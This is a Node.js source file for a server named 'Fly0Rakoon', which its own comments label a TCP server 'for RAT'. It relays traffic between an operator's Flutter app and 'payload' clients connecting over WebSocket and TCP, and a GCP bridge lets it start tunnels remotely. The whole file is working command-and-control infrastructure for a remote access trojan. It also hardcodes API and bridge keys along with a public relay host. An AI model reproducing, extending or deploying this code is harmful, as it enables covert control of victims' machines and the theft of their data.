const express = require('express');
const WebSocket = require('ws');
const http = require('http');
const net = require('net');
const cors = require('cors');

const app = express();
// ==================== PASSWORD CHECKER ====================
// This is like a bouncer at a club - only people with the password get in!

// The valid passwords (you can add more later for friends)
const VALID_API_KEYS = new Set([
    process.env.API_KEY || 'fly0rakoon-secret-key-2024',  // Your main password
    // Add more passwords here for your friends:
    // 'friend1-secret-key',
    // 'friend2-secret-key',
]);

// This function checks if someone has the password
const checkPassword = (req, res, next) => {
    // Look for the password in the request headers
    const password = req.headers['x-api-key'];
    
    // If no password or wrong password
    if (!password || !VALID_API_KEYS.has(password)) {
        return res.status(401).json({ 
            error: 'Unauthorized', 
            message: 'You need the secret password to use this server!' 
        });
    }
    
    // Password is correct! Let them in.
    next();
};

// Apply password check to ALL API routes
app.use('/api', checkPassword);
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

// Store active tunnels
const tunnels = new Map();
const payloads = new Map();
const pendingTunnels = new Map(); // For pre-registered tunnels

// TCP connections for RAT
const tcpClients = new Map();

// ===== ADD THIS FOR GCP BRIDGE =====
const gcpBridges = new Map();

app.use(cors());
app.use(express.json());

// Request logger for debugging
app.use((req, res, next) => {
    console.log(`[${new Date().toISOString()}] HTTP: ${req.method} ${req.url}`);
    next();
});

// Health check endpoint
app.get('/', (req, res) => {
    res.json({
        status: 'online',
        version: '1.0.0',
        tunnels: tunnels.size,
        payloads: payloads.size,
        tcpClients: tcpClients.size,
        pending: pendingTunnels.size,
        gcpBridges: gcpBridges.size,  // Add this
        timestamp: new Date().toISOString()
    });
});

// ✅ ADDED: Health check API endpoint
app.get('/api/health', (req, res) => {
    res.json({
        status: 'healthy',
        timestamp: new Date().toISOString(),
        tunnels: tunnels.size,
        pending: pendingTunnels.size,
        tcpClients: tcpClients.size,
        gcpBridges: gcpBridges.size,  // Add this
        uptime: process.uptime()
    });
});

// Register a new tunnel (called by Flutter app)
app.post('/api/tunnel/register', (req, res) => {
    const { port, type } = req.body;
    const token = generateToken();
    
    console.log(`[${new Date().toISOString()}] Registering tunnel: port=${port}, type=${type}, token=${token}`);
    
    const tunnelInfo = {
        token: token,
        port: port,
        type: type,
        registeredAt: new Date(),
        public_url: `https://${req.headers.host}/${token}`
    };
    
    pendingTunnels.set(token, tunnelInfo);
    
    res.json({
        success: true,
        token: token,
        public_url: tunnelInfo.public_url,
        tcp_port: 30225,
        tcp_host: 'gondola.proxy.rlwy.net',
        message: 'Tunnel registered. Connect via WebSocket to activate.'
    });
});

// API endpoint to get tunnel info
app.get('/api/tunnel/:id', (req, res) => {
    const tunnel = tunnels.get(req.params.id);
    if (tunnel) {
        res.json({ url: tunnel.url, port: tunnel.port, status: 'active' });
    } else {
        const pending = pendingTunnels.get(req.params.id);
        if (pending) {
            res.json({ url: pending.public_url, port: pending.port, status: 'pending' });
        } else {
            res.status(404).json({ error: 'Tunnel not found' });
        }
    }
});

// API endpoint to start a tunnel on GCP (add this)
app.post('/api/tunnel/start', (req, res) => {
    const { tunnelId, service, port, apiKey } = req.body;
    
    if (gcpBridges.size === 0) {
        return res.status(503).json({ 
            error: 'No GCP VM available. Please try again later.' 
        });
    }
    
    // Send command to first available bridge
    const [bridgeId, bridge] = gcpBridges.entries().next().value;
    
    bridge.ws.send(JSON.stringify({
        type: `start_${service}`,
        tunnelId: tunnelId,
        port: port,
        apiKey: apiKey
    }));
    
    res.json({
        success: true,
        message: `Starting ${service} tunnel...`,
        bridgeId: bridgeId
    });
});

// Catch-all for undefined routes
app.use((req, res) => {
    res.status(404).json({
        status: 'error',
        message: `Route ${req.method} ${req.url} not found`,
        availableRoutes: ['GET /', 'GET /api/health', 'POST /api/tunnel/register', 'GET /api/tunnel/:id', 'POST /api/tunnel/start', 'WebSocket /']
    });
});

// ==================== TCP SERVER FOR RAT ====================
const TCP_PORT = process.env.TCP_PORT || 8081;

const tcpServer = net.createServer((socket) => {
    const clientId = generateToken();
    tcpClients.set(clientId, socket);
    
    console.log(`[${new Date().toISOString()}] 🔌 TCP connection from ${socket.remoteAddress}:${socket.remotePort} (ID: ${clientId})`);
    
    socket.write(`Welcome to Fly0Rakoon TCP Tunnel\nYour ID: ${clientId}\n\n`);
    
    socket.on('data', (data) => {
        const message = data.toString().trim();
        console.log(`[${new Date().toISOString()}] 📦 TCP data from ${clientId}: ${message.substring(0, 100)}`);
        
        if (message.startsWith('REGISTER:')) {
            const tunnelId = message.split(':')[1];
            const tunnel = tunnels.get(tunnelId);
            if (tunnel) {
                tunnel.tcpSocket = socket;
                socket.write(`OK: Connected to tunnel ${tunnelId}\n`);
                console.log(`✅ TCP client ${clientId} registered to tunnel ${tunnelId}`);
            } else {
                socket.write(`ERROR: Tunnel ${tunnelId} not found\n`);
            }
        } else {
            for (const [tunnelId, tunnel] of tunnels) {
                if (tunnel.tcpSocket === socket && tunnel.ws) {
                    tunnel.ws.send(JSON.stringify({
                        type: 'tcp_data',
                        data: message,
                        clientId: clientId
                    }));
                }
            }
        }
    });
    
    socket.on('end', () => {
        console.log(`[${new Date().toISOString()}] 🔌 TCP client ${clientId} disconnected`);
        tcpClients.delete(clientId);
        
        for (const [tunnelId, tunnel] of tunnels) {
            if (tunnel.tcpSocket === socket) {
                delete tunnel.tcpSocket;
                if (tunnel.ws) {
                    tunnel.ws.send(JSON.stringify({
                        type: 'tcp_disconnected',
                        clientId: clientId
                    }));
                }
                break;
            }
        }
    });
    
    socket.on('error', (err) => {
        console.log(`[${new Date().toISOString()}] ❌ TCP error: ${err.message}`);
    });
});

tcpServer.listen(TCP_PORT, '0.0.0.0', () => {
    console.log(`🔌 TCP Server running on port ${TCP_PORT}`);
});

// ==================== WEBSOCKET SERVER ====================
wss.on('connection', (ws, req) => {
    const url = new URL(req.url, `http://${req.headers.host}`);
    const pathname = url.pathname;
    
    // ===== ADD THIS GCP BRIDGE HANDLER FIRST =====
    if (pathname === '/bridge') {
        const apiKey = url.searchParams.get('key');
        
        if (apiKey !== 'fly0rakoon-bridge-key-2024') {
            ws.send(JSON.stringify({ error: 'Invalid API key' }));
            ws.close();
            return;
        }
        
        const bridgeId = Math.random().toString(36).substring(2, 10);
        gcpBridges.set(bridgeId, { ws, connectedAt: new Date() });
        
        console.log(`✅ GCP Bridge connected: ${bridgeId}`);
        
        ws.on('message', (data) => {
            try {
                const msg = JSON.parse(data);
                console.log(`Bridge ${bridgeId}: ${msg.type}`);
                
                if (msg.type === 'register') {
                    console.log(`GCP VM Registered: ${msg.publicIp} (GoTunnel: ${msg.gotunnel}, Kami: ${msg.kami})`);
                } else if (msg.type === 'tunnel_ready') {
                    console.log(`✅ Tunnel Ready: ${msg.tunnelId} -> ${msg.endpoint}`);
                } else if (msg.type === 'status') {
                    console.log(`Status: ${msg.activeTunnelsCount} active tunnels`);
                }
            } catch(e) {
                console.error('Bridge message error:', e);
            }
        });
        
        ws.on('close', () => {
            console.log(`❌ GCP Bridge disconnected: ${bridgeId}`);
            gcpBridges.delete(bridgeId);
        });
        
        ws.send(JSON.stringify({ type: 'connected', message: 'GCP Bridge registered' }));
        return;
    }
    
    // ===== YOUR EXISTING WEBSOCKET CODE CONTINUES BELOW =====
    const type = url.searchParams.get('type');
    const port = url.searchParams.get('port');
    const token = url.searchParams.get('token') || generateToken();

    console.log(`[${new Date().toISOString()}] WebSocket connection: ${type}, port: ${port}, token: ${token}`);

    if (type === 'app') {
        // Check if this token was pre-registered
        const pending = pendingTunnels.get(token);
        
        const tunnel = {
            ws,
            port,
            type: 'app',
            url: `https://${req.headers.host}/${token}`,
            connectedAt: new Date()
        };
        
        if (pending) {
            tunnel.registeredAt = pending.registeredAt;
            pendingTunnels.delete(token);
            console.log(`✅ App tunnel activated (pre-registered): ${token}`);
        }
        
        tunnels.set(token, tunnel);

        ws.send(JSON.stringify({
            type: 'registered',
            token: token,
            url: tunnel.url,
            tcpPort: TCP_PORT,
            tcpHost: 'gondola.proxy.rlwy.net',
            message: 'Tunnel created! Your payload can connect via TCP'
        }));

        console.log(`✅ App tunnel created: ${token}`);

    } else if (type === 'payload') {
        const tunnelToken = url.searchParams.get('tunnel');
        const tunnel = tunnels.get(tunnelToken);

        if (tunnel) {
            payloads.set(tunnelToken, {
                ws,
                connectedAt: new Date(),
                tunnel: tunnel
            });

            ws.send(JSON.stringify({
                type: 'connected',
                tunnel: tunnelToken,
                message: 'Connected to tunnel'
            }));

            tunnel.ws.send(JSON.stringify({
                type: 'payload_connected',
                tunnel: tunnelToken,
                message: 'Payload has connected to your tunnel'
            }));

            console.log(`✅ Payload connected to tunnel: ${tunnelToken}`);

            ws.on('message', (data) => {
                if (tunnel.ws.readyState === WebSocket.OPEN) {
                    tunnel.ws.send(data);
                }
            });

            tunnel.ws.on('message', (data) => {
                if (ws.readyState === WebSocket.OPEN) {
                    ws.send(data);
                }
            });

        } else {
            ws.send(JSON.stringify({
                type: 'error',
                message: 'Tunnel not found'
            }));
            ws.close();
            console.log(`❌ Invalid tunnel token: ${tunnelToken}`);
        }
    }

    ws.on('close', () => {
        if (type === 'app') {
            const tunnel = tunnels.get(token);
            if (tunnel) {
                tunnels.delete(token);
                payloads.delete(token);
                console.log(`❌ Tunnel closed: ${token}`);
            }
        } else if (type === 'payload') {
            for (const [key, value] of payloads.entries()) {
                if (value.ws === ws) {
                    payloads.delete(key);
                    const tunnel = tunnels.get(key);
                    if (tunnel) {
                        tunnel.ws.send(JSON.stringify({
                            type: 'payload_disconnected',
                            message: 'Payload has disconnected'
                        }));
                    }
                    console.log(`❌ Payload disconnected from tunnel: ${key}`);
                    break;
                }
            }
        }
    });
});

function generateToken() {
    return Math.random().toString(36).substring(2, 15);
}

// Start HTTP/WebSocket server
const PORT = process.env.PORT || 8080;
server.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 HTTP/WebSocket Server running on port ${PORT}`);
    console.log(`📡 WebSocket endpoint: ws://localhost:${PORT}`);
    console.log(`🌐 HTTP endpoint: http://localhost:${PORT}`);
    console.log(`🔌 TCP endpoint for RAT: tcp://localhost:${TCP_PORT}`);
});
